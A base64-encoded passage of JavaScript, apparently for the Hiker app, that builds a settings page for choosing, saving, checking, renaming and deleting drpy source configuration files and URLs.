XFxuICAgIGlmICghbWFwLmhhcyhrZXkpKSB7XFxuICAgICAgbWFwLnNldChrZXksIHRydWUpO1xcbiAgICAgIHVuaXF1ZS5wdXNoKGl0ZW0pO1xcbiAgICB9XFxuICB9XFxuICByZXR1cm4gdW5pcXVlO1xcbn1cXG5sZXQgY3BhdGggPSBcXFwiaGlrZXI6Ly9maWxlcy9jYWNoZS9cXFwiICsgXFxcImRycHljb25maWcuanNvblxcXCI7XFxubGV0IHBhdGhjb25maWdzID0gW107XFxudHJ5IHtcXG4gIHBhdGhjb25maWdzID0gSlNPTi5wYXJzZShyZWFkRmlsZShjcGF0aCkpIHx8IFtdO1xcbiAgLy9wdXRNeVZhcihcXFwiZHJweUhpa2VyX2NvbmZpZ3NcXFwiLHBhdGhjb25maWdzKTtcXG59IGNhdGNoIChlKSB7XFxuICBjb25zb2xlLmxvZyhlLm1lc3NhZ2UpO1xcbn1cXG5wYXRoY29uZmlncyA9IHVuaXF1ZUFycmF5QnlQcm9wZXJ0eShwYXRoY29uZmlncywgXFxcInBhdGhcXFwiKTtcXG4vL2xvZyhwYXRoY29uZmlncylcXG5cXG5sZXQgY29uZmlnc19vYmogPSB7XFxuICBwYXRoOiBjcGF0aCxcXG4gIGNvbmZpZ3M6IHBhdGhjb25maWdzXFxufVxcbi8v5Y6G5Y+y6YWN572u6K6w5b2VXFxuXFxubGF5b3V0LnB1c2goe1xcbiAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICBkZXNjOiBcXFwi6YWN572u5ZCN56ewKOW/heWhqykgIOi3r+W+hOWSjOaWh+S7tuWkuemAieS6jOmAieS4gFxcXCIsXFxuICBleHRyYToge1xcbiAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcbiAgICBkZWZhdWx0VmFsdWU6IFxcXCJcXFwiLFxcbiAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgcHV0TXlWYXIoXFxcImRycHlIaWtlcl9jb25maWdfbmFtZVxcXCIsIGlucHV0KTtcXG4gICAgfSksXFxuICAgIGlkOiBcXFwiZHJweUhpa2VyX2NvbmZpZ19uYW1lXFxcIlxcbiAgfVxcbn0pO1xcblxcbmxldCBzZWxlY3RfbW9kZSA9IGdldEl0ZW0oXFxcInNlbGVjdF9jb25maWdfbW9kZVxcXCIsIFxcXCIwXFxcIik7XFxubGV0IG5hdiA9IFtcXFwi6Lev5b6EL1VSTFxcXCIsIFxcXCLmlofku7blpLlcXFwiXTtcXG5cXG5uYXYuZm9yRWFjaCgoeCwgaSkgPT4ge1xcbiAgbGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAoaSA9PSBzZWxlY3RfbW9kZSA/IHguZm9udGNvbG9yKFxcXCIjMTVCNzZDXFxcIikgOiB4KSxcXG4gICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxuICAgICAgc2V0SXRlbShcXFwic2VsZWN0X2NvbmZpZ19tb2RlXFxcIiwgaSArIFxcXCJcXFwiKTtcXG4gICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgIH0sIGkpLFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcbiAgfSlcXG59KVxcblxcblxcbmxldCBwYXRoID0gam9pblVybChnZXRQYXRoKFxcXCJoaWtlcjovL2ZpbGVzL1xcXCIpLCBcXFwiLi4vXFxcIi5yZXBlYXQoNSkpLnNsaWNlKDcpO1xcblxcbmlmIChzZWxlY3RfbW9kZSA9PSBcXFwiMFxcXCIpIHtcXG4gIGxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLpgInmi6lcXFwiLFxcbiAgICB1cmw6IEpTT04uc3RyaW5naWZ5KGYuZmlsZVNlbGVjdGlvblVyaSh7XFxuICAgICAgY2FsbGJhY2s6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgbGV0IHRhcmdldCA9IGZpbmRJdGVtKFxcXCJkcnB5SGlrZXJfY29uZmlnX3BhdGhcXFwiKS5leHRyYTtcXG4gICAgICAgIHVwZGF0ZUl0ZW0oXFxcImRycHlIaWtlcl9jb25maWdfcGF0aFxcXCIsIHtcXG4gICAgICAgICAgZXh0cmE6IE9iamVjdC5hc3NpZ24odGFyZ2V0LCB7XFxuICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBQQVRIXFxuICAgICAgICAgIH0pXFxuICAgICAgICB9KTtcXG4gICAgICAgIHJldHVybiB0cnVlO1xcbiAgICAgIH0pLFxcbiAgICAgIHJvb3REaXJQYXRoOiBwYXRoLFxcbiAgICAgIGluaXRpYWxQYXRoOiBwYXRoLFxcbiAgICAgIHBhdHRlcm46IDAsXFxuICAgICAgZmlsZVR5cGU6IFxcXCIuanNvblxcXCIsXFxuICAgIH0pKSxcXG4gICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgIGRlc2M6IFxcXCLphY3nva7ot6/lvoQvVVJMIOacrOWcsOmAieaLqWluZGV4Lmpzb25cXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgIGRlZmF1bHRWYWx1ZTogXFxcIlxcXCIsXFxuICAgICAgb25DaGFuZ2U6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgcHV0TXlWYXIoXFxcImRycHlIaWtlcl9jb25maWdfcGF0aFxcXCIsIGlucHV0KTtcXG4gICAgICB9KSxcXG4gICAgICBpZDogXFxcImRycHlIaWtlcl9jb25maWdfcGF0aFxcXCJcXG4gICAgfVxcbiAgfSk7XFxufVxcbmlmIChzZWxlY3RfbW9kZSA9PSBcXFwiMVxcXCIpIHtcXG4gIGxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLpgInmi6lcXFwiLFxcbiAgICB1cmw6IEpTT04uc3RyaW5naWZ5KGYuZmlsZVNlbGVjdGlvblVyaSh7XFxuICAgICAgY2FsbGJhY2s6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgbGV0IHRhcmdldCA9IGZpbmRJdGVtKFxcXCJkcnB5SGlrZXJfY29uZmlnX2ZvbGRlclxcXCIpLmV4dHJhO1xcbiAgICAgICAgdXBkYXRlSXRlbShcXFwiZHJweUhpa2VyX2NvbmZpZ19mb2xkZXJcXFwiLCB7XFxuICAgICAgICAgIGV4dHJhOiBPYmplY3QuYXNzaWduKHRhcmdldCwge1xcbiAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogUEFUSFxcbiAgICAgICAgICB9KVxcbiAgICAgICAgfSk7XFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXG4gICAgICB9KSxcXG4gICAgICByb290RGlyUGF0aDogcGF0aCxcXG4gICAgICBpbml0aWFsUGF0aDogcGF0aCxcXG4gICAgICBwYXR0ZXJuOiAxLFxcbiAgICAgIC8vZmlsZVR5cGU6IFxcXCIuanNvblxcXCIsXFxuICAgIH0pKSxcXG4gICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgIGRlc2M6IFxcXCLphY3nva7mlofku7blpLnot6/lvoQg6YCJ5oupZHJweV9qc+ebruW9lVxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgZGVmYXVsdFZhbHVlOiBcXFwiXFxcIixcXG4gICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICBwdXRNeVZhcihcXFwiZHJweUhpa2VyX2NvbmZpZ19wYXRoXFxcIiwgaW5wdXQpO1xcbiAgICAgIH0pLFxcbiAgICAgIGlkOiBcXFwiZHJweUhpa2VyX2NvbmZpZ19mb2xkZXJcXFwiXFxuICAgIH1cXG4gIH0pO1xcbn1cXG5sYXlvdXQucHVzaCh7XFxuICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgdGl0bGU6IFxcXCLnoa7orqRcXFwiLFxcbiAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChjb2JqKSA9PiB7XFxuICAgIGxldCBwYXRoID0gZ2V0TXlWYXIoXFxcImRycHlIaWtlcl9jb25maWdfcGF0aFxcXCIsIFxcXCJcXFwiKTtcXG4gICAgbGV0IG5hbWUgPSBnZXRNeVZhcihcXFwiZHJweUhpa2VyX2NvbmZpZ19uYW1lXFxcIiwgXFxcIlxcXCIpO1xcbiAgICBpZiAoIShwYXRoICYmIG5hbWUpKSB7XFxuICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+S4jeWPr+S4uuepulxcXCI7XFxuICAgIH1cXG4gICAgcGF0aCA9IHBhdGguc3RhcnRzV2l0aChcXFwiaHR0cFxcXCIpID8gcGF0aCA6IHBhdGguc3RhcnRzV2l0aChcXFwiL1xcXCIpID8gKFxcXCJmaWxlOi8vXFxcIiArIHBhdGgpIDogcGF0aDtcXG4gICAgLy9sb2cocGF0aClcXG4gICAgdHJ5IHtcXG4gICAgICBsZXQgcnVudGltZUNvbmZpZyA9IEdNLmRlZmluZU1vZHVsZShcXFwicnVudGltZUNvbmZpZ1xcXCIpO1xcbiAgICAgIGlmIChwYXRoLnN0YXJ0c1dpdGgoXFxcImh0dHBcXFwiKSkge1xcbiAgICAgICAgc2hvd0xvYWRpbmcoXFxcIuato+WcqOWKoOi9vemFjee9ri4uLlxcXCIpO1xcbiAgICAgIH1cXG5cXG4gICAgICBpZiAocnVudGltZUNvbmZpZy5zZXRDdXJyZW50Q29uZmlnKHtcXG4gICAgICAgIHBhdGgsXFxuICAgICAgICBuYW1lLFxcbiAgICAgIH0pKSB7XFxuICAgICAgICBjb2JqLmNvbmZpZ3MucHVzaCh7XFxuICAgICAgICAgIHBhdGgsXFxuICAgICAgICAgIG5hbWUsXFxuICAgICAgICB9KVxcbiAgICAgICAgY2xlYXJJdGVtKFxcXCJub19sb2FkaW5nXFxcIik7XFxuICAgICAgICBzYXZlRmlsZShjb2JqLnBhdGgsIEpTT04uc3RyaW5naWZ5KGNvYmouY29uZmlncykpO1xcbiAgICAgICAgYmFjayhmYWxzZSk7XFxuICAgICAgICBsZXQgRHJweU1hbmFnZSA9IEdNLmRlZmluZU1vZHVsZShcXFwiRHJweU1hbmFnZVxcXCIpO1xcbiAgICAgICAgRHJweU1hbmFnZS5jbGVhcigpO1xcbiAgICAgICAgJC5yZXF1aXJlKFxcXCJDaGFuZ2VTb3VyY2VQb3BcXFwiKS5zaG93KDEwMCk7XFxuICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v6K6+572u5oiQ5YqfXFxcIjtcXG4gICAgICB9XFxuICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+mFjee9ruaWh+S7tuacieivr1xcXCI7XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICByZXR1cm4gXFxcInRvYXN0Oi8vXFxcIiArIGUudG9TdHJpbmcoKTtcXG4gICAgfWZpbmFsbHl7XFxuICAgICAgaGlkZUxvYWRpbmcoKTtcXG4gICAgfVxcbiAgfSwgY29uZmlnc19vYmopLFxcbiAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG59KTtcXG5cXG5pZiAocGF0aGNvbmZpZ3MubGVuZ3RoKSB7XFxuICBsYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIFxcXCI8c21hbGw+5Y6G5Y+y6YWN572u6K6w5b2VIOeCueaIkei/m+ihjOmFjee9ruajgOmqjDwvc21hbGw+XFxcIixcXG4gICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChwKSA9PiB7XFxuICAgICAgLy9sb2cocClcXG4gICAgICBmdW5jdGlvbiB1bmlxdWUoYXJyKSB7XFxuICAgICAgICBjb25zdCByZXMgPSBuZXcgTWFwKCk7XFxuICAgICAgICByZXR1cm4gYXJyLmZpbHRlcigoYSkgPT4gIXJlcy5oYXMoYSkgJiYgcmVzLnNldChhLCAxKSlcXG4gICAgICB9XFxuICAgICAgdmFyIHJlc3VsdHMgPSBbXTtcXG4gICAgICBpZiAocC5sZW5ndGggPT0gMCkge1xcbiAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+aXoOWcsOWdgFxcXCI7XFxuICAgICAgfVxcbiAgICAgIGxpc3QgPSBwLm1hcCh4ID0+IHgucGF0aCk7XFxuICAgICAgdmFyIHRhc2sgPSBmdW5jdGlvbihvYmopIHtcXG4gICAgICAgIGxldCBzID0gRGF0ZS5ub3coKTtcXG4gICAgICAgIGxldCBqc0ZpbGVzID0gW107XFxuICAgICAgICBsZXQgY291bnQgPSAwO1xcblxcbiAgICAgICAgZnVuY3Rpb24gZmlsdGVyT3RoZXIobGlzdCkge1xcbiAgICAgICAgICByZXR1cm4gbGlzdC5maWx0ZXIoaXQgPT4gU3RyaW5nKGl0LmFwaSkuaW5jbHVkZXMoXFxcImRycHkyLm1pbi5qc1xcXCIpIHx8IFN0cmluZyhpdC5hcGkpLmluY2x1ZGVzKFxcXCJkcnB5Mi5qc1xcXCIpKVxcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKG9iai51cmwuc3RhcnRzV2l0aChcXFwiZmlsZTpcXFwiKSkge1xcbiAgICAgICAgICBsZXQgY29kZSA9IFxcXCJub1xcXCI7XFxuICAgICAgICAgIGxldCBwYXRoID0gb2JqLnVybC5yZXBsYWNlKFxcXCJmaWxlOi8vXFxcIiwgXFxcIlxcXCIpO1xcbiAgICAgICAgICBsZXQgZGlyID0gbmV3IGphdmEuaW8uRmlsZShwYXRoKTtcXG4gICAgICAgICAgaWYgKGRpci5pc0RpcmVjdG9yeSgpKSB7XFxuICAgICAgICAgICAgbGV0IGZsaXN0ID0gZGlyLmxpc3RGaWxlcygpO1xcbiAgICAgICAgICAgIGZvciAodmFyIGYgb2YgZmxpc3QpIHtcXG4gICAgICAgICAgICAgIC8vIOajgOafpeaWh+S7tuWQjeaYr+WQpuS7pS5qc+e7k+WwvlxcbiAgICAgICAgICAgICAgaWYgKGYuaXNGaWxlKCkgJiYgZi5nZXROYW1lKCkudG9Mb3dlckNhc2UoKS5lbmRzV2l0aChcXFwiLmpzXFxcIikpIHtcXG4gICAgICAgICAgICAgICAganNGaWxlcy5wdXNoKGYpO1xcbiAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgfVxcbiAgICAgICAgICBpZiAoZGlyLmlzRmlsZSgpICYmIGZpbGVFeGlzdChvYmoudXJsKSkge1xcbiAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICBqc29uID0gSlNPTi5wYXJzZShyZWFkRmlsZShvYmoudXJsKSk7XFxuICAgICAgICAgICAgICBpZiAoQXJyYXkuaXNBcnJheShqc29uLnNpdGVzKSB8fCBqc29uLnNpdGVzLmxlbmd0aCkge1xcbiAgICAgICAgICAgICAgICBjb3VudCA9IGZpbHRlck90aGVyKGpzb24uc2l0ZXMpLmxlbmd0aDtcXG4gICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9IGNhdGNoIChlKSB7fVxcbiAgICAgICAgICAgIGNvZGUgPSBcXFwib2tcXFwiO1xcbiAgICAgICAgICB9XFxuICAgICAgICAgIGlmIChqc0ZpbGVzLmxlbmd0aCA+PSA1KSB7XFxuICAgICAgICAgICAgY291bnQgPSBqc0ZpbGVzLmxlbmd0aDtcXG4gICAgICAgICAgICBjb2RlID0gXFxcIm9rXFxcIjtcXG4gICAgICAgICAgfVxcbiAgICAgICAgICByZXR1cm4ge1xcbiAgICAgICAgICAgIHRpbWU6IChEYXRlLm5vdygpIC0gcyksXFxuICAgICAgICAgICAgdXJsOiBvYmoudXJsLFxcbiAgICAgICAgICAgIGNvdW50OiBjb3VudCxcXG4gICAgICAgICAgICBjb2RlOiBjb2RlLFxcbiAgICAgICAgICAgIGluZGV4OiBvYmouaVxcbiAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgICAgICB2YXIgaiA9IEpTT04ucGFyc2UoZmV0Y2gob2JqLnVybCwge1xcbiAgICAgICAgICB3aXRoSGVhZGVyczogdHJ1ZSxcXG4gICAgICAgICAgdGltZW91dDogNTAwMCxcXG4gICAgICAgIH0pKTtcXG4gICAgICAgIGxldCBlID0gRGF0ZS5ub3coKTtcXG4gICAgICAgIGxldCBjID0gZSAtIHM7XFxuICAgICAgICBpZiAob2JqLnVybC5pbmNsdWRlcyhcXFwiZ2l0aHViLmNvbVxcXCIpICYmIGouc3RhdHVzQ29kZSA9PSAyMDApIHtcXG4gICAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICB2YXIgaHRtbCA9IGouYm9keTtcXG4gICAgICAgICAgICB2YXIganNvbiA9IEpTT04ucGFyc2UocGRmaChodG1sLCBcXFwiI3JlcG8tY29udGVudC1wamF4LWNvbnRhaW5lciYmc2NyaXB0JiZIdG1sXFxcIikpO1xcbiAgICAgICAgICAgIGxldCBsaXN0ID0ganNvbi5wYXlsb2FkLnRyZWUuaXRlbXM7XFxuICAgICAgICAgICAgY291bnQgPSBsaXN0LmZpbHRlcih4ID0+IHgubmFtZS5lbmRzV2l0aChcXFwiLmpzXFxcIikpLmxlbmd0aDtcXG4gICAgICAgICAgfSBjYXRjaCB7fVxcbiAgICAgICAgfVxcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgbGV0IGpzb24gPSBKU09OLnBhcnNlKHRvQ29ycmVjdEpTT05TdHJpbmcoai5ib2R5KSB8fCBcXFwie31cXFwiKTtcXG4gICAgICAgICAgaWYgKEFycmF5LmlzQXJyYXkoanNvbi5zaXRlcykgfHwganNvbi5zaXRlcy5sZW5ndGgpIHtcXG4gICAgICAgICAgICBjb3VudCA9IGZpbHRlck90aGVyKGpzb24uc2l0ZXMpLmxlbmd0aDtcXG4gICAgICAgICAgfVxcbiAgICAgICAgfSBjYXRjaCAoZSkge31cXG5cXG4gICAgICAgIHJldHVybiB7XFxuICAgICAgICAgIHRpbWU6IGMsXFxuICAgICAgICAgIHVybDogai51cmwsXFxuICAgICAgICAgIGNvdW50OiBjb3VudCxcXG4gICAgICAgICAgY29kZTogai5zdGF0dXNDb2RlLFxcbiAgICAgICAgICBpbmRleDogb2JqLmksXFxuICAgICAgICB9XFxuICAgICAgfTtcXG4gICAgICBsZXQgdGFza3MgPSBsaXN0Lm1hcCgoeCwgaSkgPT4ge1xcbiAgICAgICAgaSA9IGkgKyAxO1xcbiAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgZnVuYzogdGFzayxcXG4gICAgICAgICAgcGFyYW06IHtcXG4gICAgICAgICAgICB1cmw6IHgsXFxuICAgICAgICAgICAgaTogaSAtIDEsXFxuICAgICAgICAgIH0sXFxuICAgICAgICAgIGlkOiAndGFza2lkJyArIGlcXG4gICAgICAgIH1cXG4gICAgICB9KTtcXG4gICAgICB2YXIgY291bnQgPSBzdWNjZXNzID0gdGFza3MubGVuZ3RoO1xcbiAgICAgIGJlKHRhc2tzLCB7XFxuICAgICAgICBmdW5jOiBmdW5jdGlvbihvYmosIGlkLCBlcnJvciwgdGFza1Jlc3VsdCkge1xcbiAgICAgICAgICBvYmoucmVzdWx0cy5wdXNoKHRhc2tSZXN1bHQpXFxuICAgICAgICAgIGNvdW50ID0gY291bnQgLSAxO1xcbiAgICAgICAgICBpZiAoY291bnQgPiAwKSB7XFxuICAgICAgICAgICAgc2hvd0xvYWRpbmcoXFxcIuajgOa1i+S4rS4uLuWJqeS9meWcsOWdgO+8mlxcXCIgKyBjb3VudClcXG4gICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBoaWRlTG9hZGluZygpO1xcbiAgICAgICAgICB9XFxuICAgICAgICB9LFxcbiAgICAgICAgcGFyYW06IHtcXG4gICAgICAgICAgaGk6ICdjY2MnLFxcbiAgICAgICAgICByZXN1bHRzOiByZXN1bHRzXFxuICAgICAgICB9XFxuICAgICAgfSwgc3VjY2Vzcyk7XFxuICAgICAgLy9sb2cocmVzdWx0cylcXG4gICAgICByZXN1bHRzID0gcmVzdWx0cy5maWx0ZXIoZiA9PiBmKTtcXG4gICAgICByZXN1bHRzLmZvckVhY2goKHgsIGkpID0+IHtcXG4gICAgICAgIGxldCBpdGVtID0gZmluZEl0ZW0oXFxcInBhdGhcXFwiICsgeC5pbmRleCk7XFxuICAgICAgICBsZXQgcmVnZXggPSAvKOWQjeensDouKj8pKFxcXFxzKyk/XFxcXG4vZztcXG4gICAgICAgIGxldCB0aXRsZSA9IFxcXCLlkI3np7A6XFxcIiArIHBbeC5pbmRleF0ubmFtZSArIFxcXCIgXFxcIjtcXG4gICAgICAgIGxldCB1cmwgPSBwW3guaW5kZXhdLnBhdGg7XFxuICAgICAgICBsZXQgbXNnID0gXFxcIlxcXCI7XFxuICAgICAgICBsZXQgY291bnQgPSB4LmNvdW50ICE9IDAgPyBcXFwiIOa6kOaVsOmHjzpcXFwiICsgeC5jb3VudCA6IFxcXCJcXFwiO1xcbiAgICAgICAgaWYgKC9uby8udGVzdCh4LmNvZGUpKSB7XFxuICAgICAgICAgIG1zZyA9IGl0ZW0udGl0bGUucmVwbGFjZShyZWdleCwgdGl0bGUgKyBcXFwi6YWN572u5pyJ6K+vXFxcIi5mb250Y29sb3IoXFxcInJlZFxcXCIpICsgXFxcIlxcXFxuXFxcIik7XFxuICAgICAgICB9IGVsc2UgaWYgKC9eKC0xfDB8NDA0KS8udGVzdCh4LmNvZGUpKSB7XFxuICAgICAgICAgIG1zZyA9IGl0ZW0udGl0bGUucmVwbGFjZShyZWdleCwgdGl0bGUgKyBcXFwi5peg5rOV6K6/6ZeuXFxcIi5mb250Y29sb3IoXFxcInJlZFxcXCIpICsgXFxcIlxcXFxuXFxcIik7XFxuICAgICAgICB9IGVsc2UgaWYgKC9eMjAwLy50ZXN0KHguY29kZSkpIHtcXG4gICAgICAgICAgbXNnID0gaXRlbS50aXRsZS5yZXBsYWNlKHJlZ2V4LCB0aXRsZSArIFxcXCLpgJrorq/mraPluLhcXFwiLmZvbnRjb2xvcihcXFwiIzNDQjM3MVxcXCIpICsgXFxcIiAg5bu26L+fOlxcXCIgKyB4LnRpbWUgKyBjb3VudCArIFxcXCJcXFxcblxcXCIpO1xcbiAgICAgICAgICAvL3VybCA9IGl0ZW0udXJsO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgbXNnID0gaXRlbS50aXRsZS5yZXBsYWNlKHJlZ2V4LCB0aXRsZSArIFxcXCLphY3nva7mraPnoa5cXFwiLmZvbnRjb2xvcihcXFwiIzNDQjM3MVxcXCIpICsgY291bnQgKyBcXFwiXFxcXG5cXFwiKTtcXG4gICAgICAgICAgLy91cmwgPSBpdGVtLnVybDtcXG4gICAgICAgIH1cXG4gICAgICAgIHVwZGF0ZUl0ZW0oaXRlbS5leHRyYS5pZCwge1xcbiAgICAgICAgICB0aXRsZTogbXNnLFxcbiAgICAgICAgICAvL3VybDogdXJsLFxcbiAgICAgICAgfSlcXG4gICAgICB9KTtcXG4gICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiXFxuICAgIH0sIHBhdGhjb25maWdzKSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIlxcbiAgfSlcXG4gIHBhdGhjb25maWdzLmZvckVhY2goKGl0ZW0sIGkpID0+IHtcXG4gICAgbGV0IGxvbmdDID0gW3tcXG4gICAgICB0aXRsZTogXFxcIuWQjeensFxcXCIsXFxuICAgICAganM6ICQudG9TdHJpbmcoKGl0ZW0sIHAsIGMpID0+IHtcXG4gICAgICAgIGxldCBpID0gYy5maW5kSW5kZXgoeCA9PiB4Lm5hbWUgPT0gaXRlbS5uYW1lKTtcXG4gICAgICAgIGlmIChpICE9IC0xKSB7XFxuICAgICAgICAgIHJldHVybiAkKGNbaV0ubmFtZSwgXFxcIui+k+WFpeaWsOWQjeensFxcXCIpLmlucHV0KChjLCBwLCBpKSA9PiB7XFxuICAgICAgICAgICAgY1tpXS5uYW1lID0gaW5wdXQ7XFxuICAgICAgICAgICAgc2F2ZUZpbGUocCwgSlNPTi5zdHJpbmdpZnkoYykpO1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgIH0sIGMsIHAsIGkpXFxuICAgICAgICB9XFxuICAgICAgfSwgaXRlbSwgY3BhdGgsIHBhdGhjb25maWdzKVxcbiAgICB9LCB7XFxuICAgICAgdGl0bGU6IFxcXCLot6/lvoRcXFwiLFxcbiAgICAgIGpzOiAkLnRvU3RyaW5nKChpdGVtLCBwLCBjKSA9PiB7XFxuICAgICAgICBsZXQgaSA9IGMuZmluZEluZGV4KHggPT4geC5uYW1lID09IGl0ZW0ubmFtZSk7XFxuICAgICAgICBpZiAoaSAhPSAtMSkge1xcbiAgICAgICAgICByZXR1cm4gJChjW2ldLnBhdGgsIFxcXCLovpPlhaXmlrDot6/lvoRcXFwiKS5pbnB1dCgoYywgcCwgaSkgPT4ge1xcbiAgICAgICAgICAgIGNbaV0ucGF0aCA9IGlucHV0O1xcbiAgICAgICAgICAgIHNhdmVGaWxlKHAsIEpTT04uc3RyaW5naWZ5KGMpKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICB9LCBjLCBwLCBpKVxcbiAgICAgICAgfVxcbiAgICAgIH0sIGl0ZW0sIGNwYXRoLCBwYXRoY29uZmlncylcXG4gICAgfSwge1xcbiAgICAgIHRpdGxlOiBcXFwi5Yig6ZmkXFxcIixcXG4gICAgICBqczogJC50b1N0cmluZygoaXRlbSwgcCwgYykgPT4ge1xcbiAgICAgICAgbGV0IGkgPSBjLmZpbmRJbmRleCh4ID0+IHgubmFtZSA9PSBpdGVtLm5hbWUpO1xcbiAgICAgICAgaWYgKGkgIT0gLTEpIHtcXG4gICAgICAgICAgYy5zcGxpY2UoaSwgMSk7XFxuICAgICAgICAgIHNhdmVGaWxlKHAsIEpTT04uc3RyaW5naWZ5KGMpKTtcXG4gICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgIH1cXG4gICAgICB9LCBpdGVtLCBjcGF0aCwgcGF0aGNvbmZpZ3MpXFxuICAgIH1dXFxuICAgIGlmIChpdGVtLnBhdGguc3RhcnRzV2l0aChcXFwiaHR0cFxcXCIpKSB7XFxuICAgICAgbG9uZ0MucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuiuv+mXrlxcXCIsXFxuICAgICAgICBqczogJC50b1N0cmluZygoaXRlbSkgPT4ge1xcbiAgICAgICAgICBpZiAoaXRlbS5wYXRoLnN0YXJ0c1dpdGgoXFxcImh0dHBcXFwiKSkge1xcbiAgICAgICAgICAgIHJldHVybiBcXFwid2ViOi8vXFxcIiArIGl0ZW0ucGF0aDtcXG4gICAgICAgICAgfVxcbiAgICAgICAgfSwgaXRlbSlcXG4gICAgICB9KVxcbiAgICB9XFxuICAgIGxldCBjdXJyZW50ID0gXFxcIlxcXCI7XFxuICAgIGlmIChjdXJyZW50Y29uZmlnICYmIGN1cnJlbnRjb25maWcuaGFzT3duUHJvcGVydHkoXFxcInBhdGhcXFwiKSkge1xcbiAgICAgIGlmIChpdGVtLnBhdGggPT0gY3VycmVudGNvbmZpZy5wYXRoKSB7XFxuICAgICAgICBjdXJyZW50ID0gXFxcIuKeoe+4j1xcXCI7XFxuICAgICAgfVxcbiAgICB9XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyBcXFwiPHNtYWxsPlxcXCIgKyBjdXJyZW50ICsgXFxcIuWQjeensDpcXFwiICsgaXRlbS5uYW1lICsgXFxcIlxcXFxu6Lev5b6EOlxcXCIgKyBpdGVtLnBhdGggKyBcXFwiPC9zbWFsbD5cXFwiLFxcbiAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZShpdGVtID0+IHtcXG4gICAgICAgIGNsZWFySXRlbShcXFwibm9fbG9hZGluZ1xcXCIpO1xcbiAgICAgICAgbGV0IHJ1bnRpbWVDb25maWcgPSBHTS5kZWZpbmVNb2R1bGUoXFxcInJ1bnRpbWVDb25maWdcXFwiKTtcXG4gICAgICAgIGxldCB7XFxuICAgICAgICAgIHBhdGgsXFxuICAgICAgICAgIG5hbWVcXG4gICAgICAgIH0gPSBpdGVtO1xcbiAgICAgICAgaWYgKHBhdGguc3RhcnRzV2l0aChcXFwiaHR0cFxcXCIpKSB7XFxuICAgICAgICAgIHNob3dMb2FkaW5nKFxcXCLmraPlnKjliqDovb3phY3nva4uLi5cXFwiKTtcXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChydW50aW1lQ29uZmlnLnNldEN1cnJlbnRDb25maWcoe1xcbiAgICAgICAgICBwYXRoLFxcbiAgICAgICAgICBuYW1lLFxcbiAgICAgICAgfSkpIHtcXG4gICAgICAgICAgYmFjayhmYWxzZSk7XFxuICAgICAgICAgIGxldCBEcnB5TWFuYWdlID0gR00uZGVmaW5lTW9kdWxlKFxcXCJEcnB5TWFuYWdlXFxcIik7XFxuICAgICAgICAgIERycHlNYW5hZ2UuY2xlYXIoKTtcXG4gICAgICAgICAgJC5yZXF1aXJlKFxcXCJDaGFuZ2VTb3VyY2VQb3BcXFwiKS5zaG93KDEwMCk7XFxuICAgICAgICAgIGhpZGVMb2FkaW5nKCk7XFxuICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgI